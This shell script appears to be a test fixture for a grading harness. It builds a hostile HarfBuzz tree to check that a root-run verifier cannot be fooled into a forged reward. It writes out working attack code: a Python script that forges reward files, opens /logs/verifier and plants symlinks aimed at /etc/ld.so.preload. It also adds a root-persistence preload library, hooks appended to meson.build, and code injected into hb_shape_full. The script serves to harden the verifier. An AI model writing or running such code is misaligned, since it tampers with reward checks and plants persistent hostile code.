#!/bin/sh
# make_hostile BASE_TREE OUT_TREE
#
# A delivered tree whose build and library try to take over the check, as the `builder` user the verifier runs them
# as. BASE_TREE is the shipped 14.3.0 tree, whose true score is 0, so any reward above 0 is a forged one. The tree:
#   - at `meson setup` (a run_command) and again at `ninja` (a custom target), writes {"reward": 1.0} to
#     /logs/verifier/reward.json and 1.0 to reward.txt, tries to open /logs/verifier to everyone, and plants links
#     under every name root has read or written (batch-N.tsv/.in/.out, the step logs, the result files, the reserve)
#     in every folder root uses (/tmp/hbv and its folders, /var/lib/hbv, /logs/verifier, /app/harfbuzz), aimed at
#     the reward, at /etc/ld.so.preload and at the recorded outputs;
#   - at `ninja`, also builds /tmp/hbv-preload.so, which forges the reward from a lasting root process if root
#     ever loads it (that is, if root ever wrote its path into /etc/ld.so.preload);
#   - in the library, on the first hb_shape_full() call of each process: looks up where its standard input and
#     output lead, writes the forged reward or the preload path there if root handed over a planted name, runs the
#     same attack again, and leaves a process holding its input and output;
#   - at every stage, leaves a process behind (in a session of its own) that repeats the forging and planting.
# Expected: reward.txt 0.0, written by root as a regular file; no reward.json; metrics.json notes that processes
# of builder were left running after setup, build and the batches that shape, and were killed; the reward does not
# move however the attack's races fall.
# Copied without test/ (the product build never reads it). Runs inside the pipeline image only.
set -eu
BASE=$1
OUT=$2
test ! -e "$OUT"
mkdir -p "$OUT"
(cd "$BASE" && tar -cf - --exclude=./test .) | (cd "$OUT" && tar -xf -)
mkdir "$OUT/hostile"

cat > "$OUT/hostile/attack.py" <<'PY'
"""Hostile probe: the delivered tree's build and library try to take over the check, as `builder`.

usage: attack.py setup | build STAMP | library STDIN_PATH STDOUT_PATH

Every attempt is expected to fail; none may change the reward.
"""

import os
import shutil
import subprocess
import sys
import time

R = "/logs/verifier"
HERE = os.path.dirname(os.path.abspath(__file__))
SELF_COPY = "/tmp/.hbv-attack.py"
PRELOAD = "/tmp/hbv-preload.so"
TARGETS = (R + "/reward.json", "/etc/ld.so.preload", "/tests/private/expected.json")
FOLDERS = (
    "/tmp/hbv",
    "/tmp/hbv/b",
    "/tmp/hbv/drv",
    "/tmp/hbv/home",
    "/tmp/hbv/tree",
    "/var/lib/hbv",
    R,
    "/app/harfbuzz",
)
PROGRAMS = ("hbdrv", "hbapi", "hbmeta", "hbapi48", "hbapi49", "hbapi51")
NAMES = (
    [f"batch-{n}.{ext}" for n in range(300) for ext in ("tsv", "in", "out")]
    + ["setup.log", "build.log"]
    + [f"{p}-{k}.log" for p in PROGRAMS for k in ("compile", "link")]
    + ["reward.txt", "reward.json", "metrics.json", "outputs.tsv"]
    + ["reserve", "result-1", "result-2"]
)


def quietly(fn, *args):
    try:
        fn(*args)
    except OSError:
        pass


def write(path, data):
    with open(path, "wb") as fh:
        fh.write(data)


def forge():
    quietly(write, R + "/reward.json", b'{"reward": 1.0}\n')
    quietly(write, R + "/reward.txt", b"1.0\n")
    quietly(os.chmod, R, 0o777)


def plant(folders):
    for folder in folders:
        for i, name in enumerate(NAMES):
            path = os.path.join(folder, name)
            if os.path.islink(path) or os.path.isfile(path):
                quietly(os.unlink, path)
            quietly(os.symlink, TARGETS[i % len(TARGETS)], path)


def linger(keep_streams):
    """A process left behind, in a session of its own, that forges and plants until it is killed.

    It closes every descriptor but its standard streams (ninja learns that a command ended when a pipe it passes
    closes, and meson reads run_command's output to its end), so the tree's own build still finishes. With
    keep_streams it keeps those streams: the step's output, which the verifier once read through a pipe."""
    pid = os.fork()
    if pid:
        os.waitpid(pid, 0)
        return
    os.setsid()
    if os.fork():
        os._exit(0)
    if not keep_streams:
        null = os.open(os.devnull, os.O_RDWR)
        for fd in (0, 1, 2):
            os.dup2(null, fd)
    os.closerange(3, 1 << 16)
    while True:
        forge()
        plant((FOLDERS[0], R, "/app/harfbuzz"))
        time.sleep(0.2)


def main():
    stage = sys.argv[1]
    quietly(shutil.copyfile, os.path.abspath(__file__), SELF_COPY)
    if stage == "build":
        subprocess.run(
            ["cc", "-shared", "-fPIC", "-O2", "-o", PRELOAD, os.path.join(HERE, "preload.c")],
            check=False,
        )
    streams = [p for p in sys.argv[2:4] if stage == "library" and p.startswith("/")]
    forge()
    plant(FOLDERS + tuple(sorted({os.path.dirname(p) for p in streams})))
    # In ninja's console pool the build stage's streams are the verifier's own step log; meson's run_command and
    # the library's system() call give pipes and /dev/null, which the process left behind lets go of.
    linger(keep_streams=stage == "build")
    if stage == "build":
        write(sys.argv[2], b"")
    print(f"product build: {stage} done")


main()
PY

cat > "$OUT/hostile/preload.c" <<'C'
/* Hostile probe. It does nothing unless root loads it: had root written this file's path into /etc/ld.so.preload,
   every program root starts would load it, and it would keep forging the reward from a root process that outlives
   the check's own cleanup. */
#include <fcntl.h>
#include <string.h>
#include <unistd.h>

static void
forge (void)
{
  const char *json = "{\"reward\": 1.0}\n";
  int fd = open ("/logs/verifier/reward.json", O_WRONLY | O_CREAT | O_TRUNC, 0644);
  if (fd >= 0)
  {
    ssize_t written = write (fd, json, strlen (json));
    (void) written;
    close (fd);
  }
}

__attribute__ ((constructor)) static void
hostile_preload (void)
{
  if (geteuid () != 0)
    return;
  forge ();
  if (fork () == 0)
  {
    setsid ();
    for (;;)
    {
      forge ();
      usleep (100000);
    }
  }
}
C

cat >> "$OUT/meson.build" <<'MESON'

# Hostile probe (scripts/pipeline/make_hostile.sh): the build's own commands try to take over the check.
hostile_python = find_program('python3')
run_command(hostile_python, meson.current_source_dir() / 'hostile' / 'attack.py', 'setup', check: false)
custom_target('hostile-build',
  output: 'hostile-build.stamp',
  command: [hostile_python, files('hostile/attack.py'), 'build', '@OUTPUT@'],
  build_by_default: true,
  console: true,
)
MESON

python3 - "$OUT/src/hb-shape.cc" <<'PY'
import re
import sys
from pathlib import Path

path = Path(sys.argv[1])
s = path.read_text()
probe = r'''
#include <limits.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

/* Hostile probe (scripts/pipeline/make_hostile.sh): on the first shaping call of each process, try to take over
 * the check from inside the library. */
static inline void
_hb_probe_hostile (void)
{
  static int done;
  if (done)
    return;
  done = 1;
  char in[PATH_MAX], out[PATH_MAX];
  ssize_t n = readlink ("/proc/self/fd/0", in, sizeof (in) - 1);
  in[n > 0 ? n : 0] = '\0';
  n = readlink ("/proc/self/fd/1", out, sizeof (out) - 1);
  out[n > 0 ? n : 0] = '\0';
  /* Where root handed over a file under a name we planted, write what that file would need. */
  const char *payload = nullptr;
  if (!strcmp (out, "/logs/verifier/reward.json"))
    payload = "{\"reward\": 1.0}\n";
  else if (!strcmp (out, "/etc/ld.so.preload"))
    payload = "/tmp/hbv-preload.so\n";
  if (payload && write (1, payload, strlen (payload)) < 0)
    return;
  /* The attack script again, with nothing of it on our output. */
  char cmd[3 * PATH_MAX];
  snprintf (cmd, sizeof (cmd), "python3 /tmp/.hbv-attack.py library '%s' '%s' </dev/null >/dev/null 2>&1", in, out);
  int status = system (cmd);
  (void) status;
  /* And a process that keeps our input and output open. */
  if (fork () == 0)
  {
    setsid ();
    for (;;)
      pause ();
  }
}
'''
anchor = '#include "hb-machinery.hh"\n'
if s.count(anchor) != 1:
    raise SystemExit(f"{path}: no single {anchor.strip()}")
s = s.replace(anchor, anchor + probe, 1)
m = re.search(r"\nhb_shape_full \([^)]*\)\n\{\n", s)
if not m:
    raise SystemExit(f"hb_shape_full not found in {path}")
s = s[: m.end()] + "  _hb_probe_hostile ();\n" + s[m.end() :]
path.write_text(s)
PY
echo "hostile tree: $(grep -c _hb_probe_hostile "$OUT/src/hb-shape.cc") probe lines, $(wc -l < "$OUT/hostile/attack.py") lines of attack"
